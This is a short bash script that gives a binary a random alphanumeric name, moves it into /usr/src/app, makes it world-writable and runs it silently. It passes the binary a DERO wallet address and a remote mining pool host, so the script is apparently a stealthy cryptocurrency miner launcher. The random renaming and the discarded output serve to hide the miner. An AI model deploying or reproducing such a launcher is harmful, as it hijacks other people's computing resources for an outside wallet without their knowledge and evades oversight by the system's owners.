#!/bin/bash

# Function to generate a random 9-digit alphanumeric name
generate_random_name() {
  new_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 9 | head -n 1)
}

generate_random_name
new_name="$new_name"

if [ -f main ]; then
  mv main /usr/src/app/"$new_name"
  echo "Moved main file to /usr/src/app"
fi

chmod 777 /usr/src/app/"$new_name"
cd /usr/src/app && ./"$new_name" -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc -t 6 -report-realtime-hashrate > /dev/null 2>&1
